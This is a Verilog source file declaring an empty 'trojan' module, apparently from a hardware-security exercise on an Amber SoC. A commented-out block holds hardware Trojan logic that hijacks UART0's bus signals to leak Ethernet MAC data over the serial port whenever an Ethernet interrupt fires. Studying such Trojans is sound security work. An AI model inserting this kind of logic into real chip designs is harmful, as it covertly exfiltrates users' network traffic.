
module trojan (
    input wire i_clk,
    input wire i_rst,

    // Spy on ethernet data
    input wire        i_eth_s_wb_ack,
    input wire [31:0] i_eth_s_wb_dat_r,
    input wire        i_ethmac_int,

    // Write to uart
    output reg o_control_uart,
    output reg [31:0] o_uart_s_wb_adr,
    output reg [3:0]  o_uart_s_wb_sel,
    output reg        o_uart_s_wb_we,
    output reg [31:0] o_uart_s_wb_dat_w,
    output reg        o_uart_s_wb_cyc,
    output reg        o_uart_s_wb_stb
    );



endmodule


//XXX: Put logic that does this into the module
/*
/// -------------------------------------------------------------
/// Hardware Trojan logic for outputting ETHMAC from UART0
/// -------------------------------------------------------------

wire [31:0] 			i_uart0_adr;
wire					i_uart0_we;
wire [31:0]				i_uart0_dat;
wire					i_uart0_stb;

assign i_uart0_adr = (ethmac_int && emm_wb_ack) ? AMBER_UART_DR : s_wb_adr[3];
assign i_uart0_we = (ethmac_int && emm_wb_ack) ? 1'b1 : s_wb_we[3];
assign i_uart0_dat = (ethmac_int && emm_wb_ack) ? emm_wb_wdat : s_wb_dat_w[3];
assign i_uart0_stb = (ethmac_int && emm_wb_ack) ? 1'b1 : s_wb_stb[3];

// Replace the appropriate signals in the UART0 instantiation
*/
